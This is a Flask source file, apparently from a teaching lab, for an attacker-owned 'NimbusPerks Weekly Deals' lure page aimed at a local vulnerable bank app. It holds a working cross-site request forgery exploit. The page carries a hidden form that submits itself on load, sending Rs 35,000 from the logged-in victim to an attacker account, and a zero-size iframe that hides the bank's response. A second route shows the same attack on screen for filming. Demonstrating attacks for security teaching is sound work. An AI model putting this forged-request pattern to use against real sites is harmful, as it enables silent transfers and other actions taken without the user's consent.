"""
NimbusPerks — attacker-owned page (part of the CSRF demonstration).

Category : Cross-Site Request Forgery (CSRF)
Variant  : POST-based forged action (auto-submitting form)

Run:  python3 attacker/app.py   →  http://localhost:3001

THE EXPLOIT (route "/")
-----------------------
Serves an innocent-looking "NimbusPerks Weekly Deals" shopping page. Buried
inside it:

  * an auto-submitting hidden <form method="POST" action="http://localhost:3000/transfer">
    — this is the forged request: it silently moves Rs 35,000 from the victim
    to the attacker's account 6666 0000 0000, and
  * a hidden zero-size <iframe> (target="hit-frame") that swallows the bank's
    response, so the victim notices nothing at all.

It works because the victim (Alice) keeps a logged-in session with
NimbusBank, and her browser automatically attaches the session cookie to the
cross-site POST. The vulnerable bank handler (bank/app.py → POST /transfer)
verifies only that cookie, so the transfer executes as Alice.

THE SAME ATTACK, MADE VISIBLE (route "/visible")
-----------------------------------------------
Serves the *exact same* auto-submitting forged request — no button, it fires
on page load — but with the machinery drawn on screen instead of hidden:
the forged form's hidden inputs are displayed as real fields, and the
normally-invisible iframe is rendered full size so the outcome can be watched
live: either the bank's success dashboard (when bank/app.py ships
compromised) or its 403 "Request blocked" page (after the student uncomments
the fix inside POST /transfer). Film either view here.
"""

from datetime import datetime

from flask import Flask

app = Flask(__name__)

ATTACKER_ACCOUNT = "666600000000"
STOLEN_AMOUNT = "35000"
BANK_ORIGIN = "http://localhost:3000"

STYLE = """
  :root { --bg:#f6f7fb; --ink:#1c2333; --muted:#6b7280; --accent:#e11d48; }
  * { box-sizing:border-box; }
  body { margin:0; font:15px/1.55 "Inter","Segoe UI",system-ui,sans-serif;
         background:
           radial-gradient(800px 400px at 90% -10%, rgba(225,29,72,.08), transparent 60%),
           var(--bg); color:var(--ink); }
  a { color:var(--accent); text-decoration:none; }
  .nav { background:#fff; border-bottom:1px solid #e5e7eb; }
  .nav-inner { max-width:1020px; margin:0 auto; padding:16px 24px;
               display:flex; align-items:center; justify-content:space-between; }
  .brand { font-weight:800; font-size:19px; }
  .brand .dot { color:var(--accent); }
  .brand small { display:block; font-weight:500; color:var(--muted); font-size:11.5px; letter-spacing:1.4px;
                 text-transform:uppercase; }
  .wrap { max-width:1020px; margin:0 auto; padding:28px 24px; }
  .hero { background:linear-gradient(120deg,#e11d48,#f97316); color:#fff; border-radius:18px;
          padding:36px 34px; box-shadow:0 16px 40px rgba(225,29,72,.25); }
  .hero h1 { margin:0 0 8px; font-size:28px; }
  .hero p { margin:0; opacity:.92; }
  .deal-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; margin-top:22px; }
  @media (max-width:760px){ .deal-grid { grid-template-columns:1fr; } }
  .deal { background:#fff; border:1px solid #e5e7eb; border-radius:14px; padding:20px;
          box-shadow:0 8px 20px rgba(17,24,39,.06); }
  .deal .emoji { font-size:30px; }
  .deal h3 { margin:10px 0 4px; font-size:16px; }
  .deal p { margin:0; color:var(--muted); font-size:13.5px; }
  .tag { display:inline-block; margin-top:10px; font-size:11px; font-weight:800; letter-spacing:.8px;
         text-transform:uppercase; color:var(--accent); background:rgba(225,29,72,.08);
         border:1px solid rgba(225,29,72,.25); border-radius:999px; padding:3px 10px; }
  .foot { max-width:1020px; margin:26px auto 40px; padding:0 24px; color:var(--muted); font-size:12.5px; }
  code { background:#0b1220; color:#7dd3fc; padding:2px 7px; border-radius:6px; font-size:12.5px; }

  /* ---- visible-attack lab ---- */
  .lab { background:#fff; border:2px solid var(--accent); border-radius:16px;
         padding:24px; margin-top:24px; box-shadow:0 12px 30px rgba(225,29,72,.12); }
  .lab h2 { margin:0 0 6px; font-size:20px; }
  .lab p.sub { margin:0 0 14px; color:var(--muted); font-size:13.5px; }
  .lab pre { background:#0b1220; color:#a5f3fc; font:12.5px/1.6 ui-monospace,"SF Mono",Menlo,Consolas,monospace;
             border-radius:12px; padding:16px 18px; overflow:auto; margin:0 0 18px; }
  .lab .cols { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
  @media (max-width:820px){ .lab .cols { grid-template-columns:1fr; } }
  .vault { border:2px dashed var(--accent); border-radius:12px; padding:14px 16px; background:#fff }
  .vault .vhead { font-size:12px; font-weight:800; letter-spacing:.8px; text-transform:uppercase;
                  color:var(--accent); margin:0 0 8px; }
  .vault form label { display:block; font-size:11.5px; font-weight:700; letter-spacing:.6px;
                      text-transform:uppercase; color:var(--muted); margin:10px 0 3px; }
  .vault form input { width:100%; padding:9px 11px; border:1px solid #e5e7eb; border-radius:8px;
                      font:inherit; color:var(--ink); background:#fafafa; }
  .status { margin-top:16px; padding:12px 16px; border-radius:10px; font-weight:700; font-size:14px;
            background:rgba(234,179,8,.14); color:#b45309; border:1px solid rgba(234,179,8,.4); }
  .status.fired { background:rgba(225,29,72,.1); color:var(--accent); border-color:rgba(225,29,72,.45); }
"""

def page(visible: bool) -> str:
    title = "NimbusPerks — Weekly Deals" if not visible else "NimbusPerks — CSRF attack, made visible"

    if not visible:
        # --------------------------------------------------------------------
        # THE REAL ATTACK VECTOR (silent). On the innocent deals page the form
        # and iframe exist but are invisible; the script submits instantly.
        # --------------------------------------------------------------------
        payload = f"""

  <form id="csrf-forged" method="POST" action="{BANK_ORIGIN}/transfer" target="hit-frame">
    <input type="hidden" name="to_account" value="{ATTACKER_ACCOUNT}">
    <input type="hidden" name="amount" value="{STOLEN_AMOUNT}">
    <input type="hidden" name="note" value="">
  </form>

  <iframe name="hit-frame" style="display:none; width:0; height:0; border:0;"></iframe>

  <script>
    document.getElementById('csrf-forged').submit();
  </script>
  """
        lab = ""
    else:
        # --------------------------------------------------------------------
        # THE SAME VECTOR, MADE VISIBLE. Identical request (same method, same
        # action, same target="hit-frame", auto-submitted with no button) —
        # only the presentation differs: the form fields are drawn as real
        # inputs and the iframe is rendered full size so the outcome can be
        # watched live. This is the evidence view for the video/report.
        # --------------------------------------------------------------------
        payload = f"""
  <div class="lab">
    <h2>⚔️ Attack vector, made visible</h2>
    <p class="sub">On the <a href="/">silent version</a> of this page the form and iframe below
      exist with <code>display:none</code> / 0×0 size and <code>type="hidden"</code>&nbsp;inputs —
      the victim sees nothing. Here they are drawn deliberately so the forgery can be watched.
      <b>No button: the form auto-submits on page load, exactly like the real attack.</b></p>
    <pre><b>&lt;form</b> id="csrf-forged" method="POST" action="{BANK_ORIGIN}/transfer" target="hit-frame"&gt;
  &lt;input type="hidden" name="to_account" value="{ATTACKER_ACCOUNT}"&gt;
  &lt;input type="hidden" name="amount" value="{STOLEN_AMOUNT}"&gt;
&lt;/form&gt;
&lt;iframe name="<b>hit-frame</b>" style="display:none"&gt;&lt;/iframe&gt;
&lt;script&gt;document.getElementById('csrf-forged').submit()&lt;/script&gt;</b></pre>
    <div class="cols">
      <div class="vault">
        <div class="vhead">① The forged form — hidden inputs, made visible</div>

        <form id="csrf-forged" method="POST" action="{BANK_ORIGIN}/transfer" target="hit-frame">
          <label>to_account (normally type="hidden")</label>
          <input name="to_account" value="{ATTACKER_ACCOUNT}">
          <label>amount (normally type="hidden")</label>
          <input name="amount" value="{STOLEN_AMOUNT}">
          <label>note</label>
          <input name="note" value="">
        </form>

      </div>
      <div class="vault">
        <div class="vhead">② The target iframe — normally invisible, shown live</div>
        <iframe name="hit-frame" style="width:100%; height:400px; border:2px solid #e5e7eb; border-radius:10px; background:#fff;"></iframe>
      </div>
    </div>
    <div id="fire-status" class="status">⏳ forged request armed — auto-submitting POST /transfer…</div>
    <script>
      // Auto-submit: the identical forged POST fires on page load (short beat
      // added so it is visible to the camera). No click, no button.
      setTimeout(function() {{
        document.getElementById('csrf-forged').submit();
        var s = document.getElementById('fire-status');
        s.className = "status fired";
        s.textContent = "🔥 FORGED POST /transfer FIRED — the bank is replying in the frame above";
      }}, 1600);
    </script>
  </div>
  """
    year = datetime.now().year
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>{STYLE}</style>
</head>
<body>
  <div class="nav"><div class="nav-inner">
    <div class="brand"><span class="dot">●</span> NimbusPerks
      <small>members-only savings club</small></div>
    <a href="#" style="font-weight:600;">Sign in</a>
  </div></div>

  <div class="wrap">
    <div class="hero">
      <h1>Flash sale of the week 🎉</h1>
      <p>Hand-picked NimbusPerks member deals — refreshed {datetime.now().strftime('%d %b %Y')}.</p>
    </div>
    {payload}
    <div class="deal-grid">
      <div class="deal">
        <div class="emoji">🛒</div>
        <h3>Bulk grocery bundle</h3>
        <p>Top-brand pantry staples at up to 40% off retail, delivered weekly.</p>
        <span class="tag">Up to 40% off</span>
      </div>
      <div class="deal">
        <div class="emoji">🎧</div>
        <h3>Audio deals</h3>
        <p>Headphones, earbuds and speakers — members-only pricing on top models.</p>
        <span class="tag">Extra club coupon</span>
      </div>
      <div class="deal">
        <div class="emoji">🧾</div>
        <h3>Cashback weekend</h3>
        <p>5% extra cashback on every order placed this Saturday &amp; Sunday.</p>
        <span class="tag">Limited time</span>
      </div>
    </div>
  </div>

  <div class="foot">
    © {year} NimbusPerks Consumer Services (Pvt.) Ltd. · You are receiving this page because you
    opted in to weekly member deals. <a href="#">Unsubscribe</a>
  </div>
</body>
</html>"""


@app.route("/")
def index():
    # The innocent-looking victim entry point. The payload rides silently.
    return page(visible=False)


@app.route("/visible")
def visible_attack():
    # The identical forged request, but the machinery (form + iframe) is
    # drawn on-screen and it still auto-submits — no button — so the outcome
    # (transfer success or the 403 blocked page) can be filmed.
    return page(visible=True)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=3001, debug=False)
